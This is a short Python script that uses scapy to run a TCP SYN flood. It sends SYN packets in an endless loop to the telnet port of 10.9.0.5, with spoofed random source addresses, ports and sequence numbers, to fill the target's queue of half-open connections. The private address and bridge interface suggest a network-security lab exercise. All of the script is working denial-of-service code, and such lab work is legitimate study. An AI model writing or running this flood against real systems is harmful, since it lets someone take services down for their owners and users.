#!/bin/env python3

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

ip  = IP(dst="10.9.0.5") #IP address of victim
tcp = TCP(dport=23, flags='S') #dport 23 means telnet and the flag S means SYN
pkt = ip/tcp

while True: #Construct packets for half open connections
    pkt[IP].src   = str(IPv4Address(getrandbits(32))) # source ip
    pkt[IP].sport = getrandbits(16)     # source port
    pkt[IP].seq   = getrandbits(32)     # sequence number 
    send(pkt, iface='br-c83e1ac99060', verbose = 0)
